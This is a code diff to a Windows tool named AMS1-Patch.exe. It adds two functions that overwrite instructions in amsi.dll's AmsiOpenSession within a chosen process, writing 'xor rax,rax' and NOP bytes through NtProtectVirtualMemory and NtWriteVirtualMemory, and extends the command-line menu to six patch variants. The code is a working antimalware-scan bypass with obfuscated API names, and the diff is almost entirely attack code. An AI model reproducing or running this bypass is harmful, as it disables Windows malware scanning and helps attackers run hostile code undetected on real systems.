@@ -110,12 +110,99 @@ void AMS1patch2(HANDLE hproc) {
 	printf("\n[+] AMSI patched !!\n\n");
 }
 
+
+void AMS1patchxor(HANDLE hproc, int number) {
+
+	void* ptr = GetProcAddress(LoadLibraryA(ams1), ams10pen);
+
+	// Before Patching:
+	// 8139414d5349		:	cmp     dword ptr [rcx],49534D41h  => AMSI,AMSI
+	// 753a				:	jne     amsi!AmsiOpenSession+0x4c  => Not Triggered
+	// 
+
+	char Patch[100];
+	lstrcatA(Patch, "\x48\x31\xC0");
+
+	printf("\n[+] The Patch : %p\n\n", *(INT_PTR*)Patch);
+
+	DWORD OldProtect = 0;
+	SIZE_T memPage = 0x1000;
+	void* ptraddr = (void*)(((INT_PTR)ptr + number));
+
+
+	NTSTATUS NtProtectStatus1 = NtProtectVirtualMemory(hproc, (PVOID*)&ptraddr, (PSIZE_T)&memPage, 0x04, &OldProtect);
+	if (!NT_SUCCESS(NtProtectStatus1)) {
+		printf("[!] Failed in NtProtectVirtualMemory1 (%u)\n", GetLastError());
+		return;
+	}
+	NTSTATUS NtWriteStatus = NtWriteVirtualMemory(hproc, (LPVOID)((INT_PTR)ptr + number), (PVOID)Patch, 3, (SIZE_T*)nullptr);
+	if (!NT_SUCCESS(NtWriteStatus)) {
+		printf("[!] Failed in NtWriteVirtualMemory (%u)\n", GetLastError());
+		return;
+	}
+	NTSTATUS NtProtectStatus2 = NtProtectVirtualMemory(hproc, (PVOID*)&ptraddr, (PSIZE_T)&memPage, OldProtect, &OldProtect);
+	if (!NT_SUCCESS(NtProtectStatus2)) {
+		printf("[!] Failed in NtProtectVirtualMemory2 (%u)\n", GetLastError());
+		return;
+	}
+
+	printf("\nAfter Patching :\n ");
+	printf("\t4831c0\t\t\t\t              :   xor    rax,rax  => ZF = 1\n");
+	printf("\t753a\t				:	jne     amsi!AmsiOpenSession+0x4c  => Triggered\n\n");
+
+	printf("\n[+] AMSI patched !!\n\n");
+}
+
+
+void AMS1xornop(HANDLE hproc, int number) {
+
+	void* ptr = GetProcAddress(LoadLibraryA(ams1), ams10pen);
+
+	// Before Patching:
+	// 4883790800      cmp     qword ptr [rcx+10h],0
+	// 7433            je      amsi!AmsiOpenSession+0x4c
+	// 
+
+	char Patch[100];
+	lstrcatA(Patch, "\x48\x31\xC0\x90\x90");
+
+	printf("\n[+] The Patch : %p\n\n", *(INT_PTR*)Patch);
+
+	DWORD OldProtect = 0;
+	SIZE_T memPage = 0x1000;
+	void* ptraddr = (void*)(((INT_PTR)ptr + number));
+
+
+	NTSTATUS NtProtectStatus1 = NtProtectVirtualMemory(hproc, (PVOID*)&ptraddr, (PSIZE_T)&memPage, 0x04, &OldProtect);
+	if (!NT_SUCCESS(NtProtectStatus1)) {
+		printf("[!] Failed in NtProtectVirtualMemory1 (%u)\n", GetLastError());
+		return;
+	}
+	NTSTATUS NtWriteStatus = NtWriteVirtualMemory(hproc, (LPVOID)((INT_PTR)ptr + number), (PVOID)Patch, 5, (SIZE_T*)nullptr);
+	if (!NT_SUCCESS(NtWriteStatus)) {
+		printf("[!] Failed in NtWriteVirtualMemory (%u)\n", GetLastError());
+		return;
+	}
+	NTSTATUS NtProtectStatus2 = NtProtectVirtualMemory(hproc, (PVOID*)&ptraddr, (PSIZE_T)&memPage, OldProtect, &OldProtect);
+	if (!NT_SUCCESS(NtProtectStatus2)) {
+		printf("[!] Failed in NtProtectVirtualMemory2 (%u)\n", GetLastError());
+		return;
+	}
+
+	printf("\nAfter Patching :\n ");
+	printf("\t4831c0\t\t\t\t              :   xor    rax,rax  => ZF = 1\n");
+	printf("\t753a\t				:	jne     amsi!AmsiOpenSession+0x4c  => Triggered\n\n");
+
+	printf("\n[+] AMSI patched !!\n\n");
+}
+
+
 int main(int argc, char** argv) {
 
 	HANDLE hProc;
 
 	if (argc < 3) {
-		printf("USAGE: AMS1-Patch.exe <PID> <Patch_Nbr, 1 or 2>\n");
+		printf("USAGE: AMS1-Patch.exe <PID> <Patch_Nbr, 1 to 6>\n");
 		return 1;
 	}
 	
@@ -128,8 +215,16 @@ int main(int argc, char** argv) {
 
 	if (atoi(argv[2]) == 1)
 		AMS1patch1(hProc);
-	else
+	else if (atoi(argv[2]) == 2)
 		AMS1patch2(hProc);
+	else if (atoi(argv[2]) == 3)
+		AMS1patchxor(hProc, 0);
+	else if (atoi(argv[2]) == 4)
+		AMS1patchxor(hProc, 5);
+	else if (atoi(argv[2]) == 5)
+		AMS1xornop(hProc, (int)0x12);
+	else
+		AMS1xornop(hProc, (int)0x19);
 	
 	return 0;
 	
